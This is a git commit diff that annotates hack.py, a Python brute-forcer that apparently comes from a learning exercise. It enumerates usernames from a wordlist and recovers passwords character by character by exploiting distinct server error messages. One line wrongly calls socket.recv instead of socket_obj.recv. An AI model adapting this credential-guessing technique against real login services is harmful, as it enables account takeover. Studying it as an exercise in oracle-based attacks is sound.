19f1d943fead871e4167c4b2e449ea2de563ea6e
João Righetto <jm_zr@hotmail.com>
2022-12-13 22:01:43 +0000

    Add comments

--- hack.py
+++ hack.py
@@ -6,36 +6,45 @@ from typing import TextIO
 from _socket import SocketType
 
 
-def brute_force(logins_file: TextIO, socket_obj: SocketType):
+def brute_force(logins_file: TextIO, socket_obj: SocketType) -> dict:
+    # Find the first login that exists on the server
     credentials = find_login(logins_file, socket_obj)
     success = False
+    # Try to find the password character by character
+    # If the password match the beginning of the correct one an exception happens
     while not success:
+        # Try all possible letters and digits
         for char in list(string.ascii_letters + string.digits):
+            # Add the current character to the end of the password
             temp_pw = credentials["password"]
             temp_pw += char
             credentials_json = json.dumps({"login": credentials["login"], "password": temp_pw})
+            # Send a login request to the server using the updated password
             socket_obj.send(credentials_json.encode())
             response = socket_obj.recv(1024).decode()
+            # If the exception occurs, save current iteration and continue to next character of the password
             if response == '{"result": "Exception happened during login"}':
                 credentials["password"] = temp_pw
                 break
+            # If the login is successful, return the login credentials
             elif response == '{"result": "Connection success!"}':
                 credentials["password"] = temp_pw
                 success = True
                 break
+            # If the response is something else, continue trying different combinations
             else:
                 continue
     return credentials
 
 
-def find_login(logins_file: TextIO, socket_obj: SocketType):
+def find_login(logins_file: TextIO, socket_obj: SocketType) -> dict:
     credentials = {"login": "", "password": ""}
     for login in logins_file:
         credentials["login"] = login.strip()
         credentials_json = json.dumps(credentials)
         socket_obj.send(credentials_json.encode())
         response = socket.recv(1024).decode()
-        if response == '{"result": "Wrong password!"}':
+        if response == '{"result": "Wrong password!"}':  # This response means that the provided login is correct
             return credentials
         else:
             continue
